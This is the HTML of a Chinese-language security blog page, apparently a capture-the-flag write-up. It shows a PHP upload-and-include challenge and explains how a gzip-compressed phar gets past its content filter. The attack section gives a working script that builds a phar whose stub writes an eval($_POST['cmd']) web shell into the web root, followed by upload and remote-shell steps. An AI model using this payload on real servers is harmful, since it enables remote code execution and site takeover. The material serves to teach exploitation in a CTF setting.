@@ -1,0 +1,180 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
+  PHP文件上传不含PHP代码实现RCE的方法
+  #
+
+
+  ?CTF2025复现
+  #
+
+
+  题目源码
+  #
+
+<?php
+error_reporting(0);
+
+$allowed_extensions = ['zip', 'bz2', 'gz', 'xz', '7z'];
+$allowed_mime_types = [
+    'application/zip',
+    'application/x-bzip2',
+    'application/gzip',`
+    'application/x-gzip',
+    'application/x-xz',
+    'application/x-7z-compressed',
+];
+
+
+function filter($tempfile)
+{
+    $data = file_get_contents($tempfile);
+    if (
+        stripos($data, &#34;__HALT_COMPILER();&#34;) !== false || stripos($data, &#34;PK&#34;) !== false ||
+        stripos($data, &#34;<?&#34;) !== false || stripos(strtolower($data), &#34;<?php&#34;) !== false
+    ) {
+        return true;
+    }
+    return false;
+}
+
+if ($_SERVER[&#34;REQUEST_METHOD&#34;] == 'POST') {
+    if (is_uploaded_file($_FILES['file']['tmp_name'])) {
+        if (filter($_FILES['file']['tmp_name']) || !isset($_FILES['file']['name'])) {
+            die(&#34;Nope :<&#34;);
+        }
+
+        // mimetype check
+        $finfo = finfo_open(FILEINFO_MIME_TYPE);
+        $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
+        finfo_close($finfo);
+
+        if (!in_array($mime_type, $allowed_mime_types)) {
+            die('unexpected mimetype');
+        }
+
+        // ext check
+        $ext = strtolower(pathinfo(basename($_FILES['file']['name']), PATHINFO_EXTENSION));
+
+        if (!in_array($ext, $allowed_extensions)) {
+            die('unexpected extension');
+        }
+
+        if (move_uploaded_file($_FILES['file']['tmp_name'], &#34;/tmp/&#34; . basename($_FILES['file']['name']))) {
+            echo &#34;File upload success!Please include with 'url'&#34;;
+        }else{
+            echo &#34;fail&#34;;
+        }     
+    }
+}
+
+if (isset($_GET['url'])) {
+    
+$include_url = basename($_GET['url']);
+
+
+if (!preg_match(&#34;/\.(zip|bz2|gz|xz|7z)/i&#34;, $include_url)) {
+    die(&#34;unexpected extension&#34;);
+}
+
+include '/tmp/' . $include_url;
+exit;
+}
+?>
+
+  源码分析
+  #
+
+这里我们很明显能看到有三道防线："><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/"><meta property="og:site_name" content="S0lowalker"><meta property="og:title" content="PHP文件上传不含PHP代码实现RCE的方法"><meta property="og:description" content="PHP文件上传不含PHP代码实现RCE的方法 # ?CTF2025复现 # 题目源码 # <?php error_reporting(0); $allowed_extensions = ['zip', 'bz2', 'gz', 'xz', '7z']; $allowed_mime_types = [ 'application/zip', 'application/x-bzip2', 'application/gzip',` 'application/x-gzip', 'application/x-xz', 'application/x-7z-compressed', ]; function filter($tempfile) { $data = file_get_contents($tempfile); if ( stripos($data, &#34;__HALT_COMPILER();&#34;) !== false || stripos($data, &#34;PK&#34;) !== false || stripos($data, &#34;<?&#34;) !== false || stripos(strtolower($data), &#34;<?php&#34;) !== false ) { return true; } return false; } if ($_SERVER[&#34;REQUEST_METHOD&#34;] == 'POST') { if (is_uploaded_file($_FILES['file']['tmp_name'])) { if (filter($_FILES['file']['tmp_name']) || !isset($_FILES['file']['name'])) { die(&#34;Nope :<&#34;); } // mimetype check $finfo = finfo_open(FILEINFO_MIME_TYPE); $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']); finfo_close($finfo); if (!in_array($mime_type, $allowed_mime_types)) { die('unexpected mimetype'); } // ext check $ext = strtolower(pathinfo(basename($_FILES['file']['name']), PATHINFO_EXTENSION)); if (!in_array($ext, $allowed_extensions)) { die('unexpected extension'); } if (move_uploaded_file($_FILES['file']['tmp_name'], &#34;/tmp/&#34; . basename($_FILES['file']['name']))) { echo &#34;File upload success!Please include with 'url'&#34;; }else{ echo &#34;fail&#34;; } } } if (isset($_GET['url'])) { $include_url = basename($_GET['url']); if (!preg_match(&#34;/\.(zip|bz2|gz|xz|7z)/i&#34;, $include_url)) { die(&#34;unexpected extension&#34;); } include '/tmp/' . $include_url; exit; } ?> 源码分析 # 这里我们很明显能看到有三道防线："><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-04-18T00:00:00+00:00"><meta property="article:modified_time" content="2026-04-18T00:00:00+00:00"><meta property="article:tag" content="RCE专题"><title>PHP文件上传不含PHP代码实现RCE的方法 | S0lowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/><link rel=stylesheet href=/book.min.31c453d41ba8febf45a3c125de02ecdbd5a000186bc220da3d8ade8f54ed6ec1.css integrity="sha256-McRT1Buo/r9Fo8El3gLs29WgABhrwiDaPYrej1TtbsE=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.f3b8735e92aacb11c612456ae889aa7fadc9da7bad1b75639d6dd000d07b5fc7.js integrity="sha256-87hzXpKqyxHGEkVq6Imqf63J2nutG3VjnW3QANB7X8c=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><a href=https://s0lowalker.github.io/ class=top-header-title>S0lowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>S0lowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li><li><input type=checkbox id=section-c47aa3d5834730def37f0c0296806937 class=toggle>
+<label for=section-c47aa3d5834730def37f0c0296806937 class="flex justify-between"><a role=button>Java反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle checked>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle checked>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/ class=active>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li><li><a href=/docs/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>PHP文件上传不含PHP代码实现RCE的方法</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#ctf2025复现>?CTF2025复现</a><ul><li><a href=#题目源码>题目源码</a></li><li><a href=#攻击手法>攻击手法</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=php文件上传不含php代码实现rce的方法>PHP文件上传不含PHP代码实现RCE的方法
+<a class=anchor href=#php%e6%96%87%e4%bb%b6%e4%b8%8a%e4%bc%a0%e4%b8%8d%e5%90%abphp%e4%bb%a3%e7%a0%81%e5%ae%9e%e7%8e%b0rce%e7%9a%84%e6%96%b9%e6%b3%95>#</a></h1><h2 id=ctf2025复现>?CTF2025复现
+<a class=anchor href=#ctf2025%e5%a4%8d%e7%8e%b0>#</a></h2><h3 id=题目源码>题目源码
+<a class=anchor href=#%e9%a2%98%e7%9b%ae%e6%ba%90%e7%a0%81>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>$allowed_extensions <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;zip&#39;</span>, <span style=color:#e6db74>&#39;bz2&#39;</span>, <span style=color:#e6db74>&#39;gz&#39;</span>, <span style=color:#e6db74>&#39;xz&#39;</span>, <span style=color:#e6db74>&#39;7z&#39;</span>];
+</span></span><span style=display:flex><span>$allowed_mime_types <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;application/zip&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;application/x-bzip2&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;application/gzip&#39;</span>,<span style=color:#960050;background-color:#1e0010>`</span>
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;application/x-gzip&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;application/x-xz&#39;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;application/x-7z-compressed&#39;</span>,
+</span></span><span style=display:flex><span>];
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>filter</span>($tempfile)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    $data <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($tempfile);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>stripos</span>($data, <span style=color:#e6db74>&#34;__HALT_COMPILER();&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>stripos</span>($data, <span style=color:#e6db74>&#34;PK&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span> <span style=color:#f92672>||</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>stripos</span>($data, <span style=color:#e6db74>&#34;&lt;?&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span> <span style=color:#f92672>||</span> <span style=color:#a6e22e>stripos</span>(<span style=color:#a6e22e>strtolower</span>($data), <span style=color:#e6db74>&#34;&lt;?php&#34;</span>) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>
+</span></span><span style=display:flex><span>    ) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>true</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ($_SERVER[<span style=color:#e6db74>&#34;REQUEST_METHOD&#34;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;POST&#39;</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>])) {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>filter</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]) <span style=color:#f92672>||</span> <span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;name&#39;</span>])) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;Nope :&lt;&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// mimetype check
+</span></span></span><span style=display:flex><span>        $finfo <span style=color:#f92672>=</span> <span style=color:#a6e22e>finfo_open</span>(<span style=color:#a6e22e>FILEINFO_MIME_TYPE</span>);
+</span></span><span style=display:flex><span>        $mime_type <span style=color:#f92672>=</span> <span style=color:#a6e22e>finfo_file</span>($finfo, $_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>finfo_close</span>($finfo);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($mime_type, $allowed_mime_types)) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;unexpected mimetype&#39;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>// ext check
+</span></span></span><span style=display:flex><span>        $ext <span style=color:#f92672>=</span> <span style=color:#a6e22e>strtolower</span>(<span style=color:#a6e22e>pathinfo</span>(<span style=color:#a6e22e>basename</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;name&#39;</span>]), <span style=color:#a6e22e>PATHINFO_EXTENSION</span>));
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>in_array</span>($ext, $allowed_extensions)) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;unexpected extension&#39;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>move_uploaded_file</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>], <span style=color:#e6db74>&#34;/tmp/&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>basename</span>($_FILES[<span style=color:#e6db74>&#39;file&#39;</span>][<span style=color:#e6db74>&#39;name&#39;</span>]))) {
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;File upload success!Please include with &#39;url&#39;&#34;</span>;
+</span></span><span style=display:flex><span>        }<span style=color:#66d9ef>else</span>{
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;fail&#34;</span>;
+</span></span><span style=display:flex><span>        }     
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;url&#39;</span>])) {
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>$include_url <span style=color:#f92672>=</span> <span style=color:#a6e22e>basename</span>($_GET[<span style=color:#e6db74>&#39;url&#39;</span>]);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/\.(zip|bz2|gz|xz|7z)/i&#34;</span>, $include_url)) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;unexpected extension&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;/tmp/&#39;</span> <span style=color:#f92672>.</span> $include_url;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>exit</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+</span></span></span></code></pre></div><h4 id=源码分析>源码分析
+<a class=anchor href=#%e6%ba%90%e7%a0%81%e5%88%86%e6%9e%90>#</a></h4><p>这里我们很明显能看到有三道防线：</p><ol><li><code>filter</code>函数：在我们读取的文件内容中不能包含<code>__HALT_COMPILER();</code>(防 phar 存根)、<code>PK</code>(防Zip头)、<code>&lt;?/&lt;?php</code>(防普通马)。</li><li><code>finfo_file()</code>函数进行MIME类型检验：只允许白名单内的压缩包格式。</li><li>后缀名检验：只允许白名单内的后缀名。</li></ol><h5 id=部分概念的解读>部分概念的解读
+<a class=anchor href=#%e9%83%a8%e5%88%86%e6%a6%82%e5%bf%b5%e7%9a%84%e8%a7%a3%e8%af%bb>#</a></h5><p><code>__HALT_COMPILER()</code>：这是一个编译器指令，作用是：当php引擎读到这个指令时停止解析，后面的内容不会检查语法，也不会尝试执行。</p><p>这个指令也是 Phar 归档文件的硬性要求：一个标准的 Phar 文件的结构为：[可执行 PHP 存根代码]+<code>__HALT_COMPILER();</code>+[压缩的二进制数据块]</p><p><strong>什么是可执行PHP存根代码？</strong></p><p>PHP存根代码（Stub）是 Phar 文件格式规定的一个<strong>引导加载程序</strong>，可以理解为 Phar 这个“压缩包”的自解压和启动程序。</p><p>这是一个简单的 PHP 文件，在 Phar 文件被<code>include</code>包含或者直接通过命令执行时会最先运行，核心任务时初始化 Phar 环境并加载内部的业务代码。</p><p>在CTF中，这是一个理想的代码注入点，因为这是 Phar 文件被包含的第一入口，放在这里的恶意代码会被自动执行。</p><p>那为什么明明已经ban了<code>__HALT_COMPILER()</code>payload中依然会有呢？</p><p>我们上传的文件时一个gz之类的压缩包，而<code>file_get_contents()</code>读取文件时读取的整个文件的二进制流，而里面的内容是被 gzip 算法加密过的乱码数据，自然读取不到。</p><p>而在<code>include</code>中，如果我们上传的文件中包含<code>.phar</code>，且没有用像<code>phar://</code>之类的形式，PHP会认为是本地文件，然后 Phar 扩展识别发现该文件是合法的 phar 文件后按照 phar文件处理。在过程中会自动解压文件。</p><h3 id=攻击手法>攻击手法
+<a class=anchor href=#%e6%94%bb%e5%87%bb%e6%89%8b%e6%b3%95>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+</span></span><span style=display:flex><span>$phar<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Phar</span>(<span style=color:#e6db74>&#34;phar.phar&#34;</span>);
+</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>startBuffering</span>();
+</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>setStub</span>(<span style=color:#e6db74>&#39;&lt;?php file_put_contents(&#34;/var/www/html/shell.php&#34;,&#34;&lt;?php eval(\$_POST[\&#39;cmd\&#39;]); ?&gt;&#34;); __HALT_COMPILER(); ?&gt;&#39;</span>);
+</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>addFromString</span>(<span style=color:#e6db74>&#34;test.txt&#34;</span>,<span style=color:#e6db74>&#34;test&#34;</span>);
+</span></span><span style=display:flex><span>$phar<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>stopBuffering</span>();
+</span></span></code></pre></div><p>利用这段代码生成一个 phar 文件，然后压缩成 gz 文件并上传，连接蚁剑即可。</p></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#ctf2025复现>?CTF2025复现</a><ul><li><a href=#题目源码>题目源码</a></li><li><a href=#攻击手法>攻击手法</a></li></ul></li></ul></nav></div></aside></main><script>(function(){var e,n,t=document.querySelector(".homepage-tree");t&&t.addEventListener("click",function(e){var 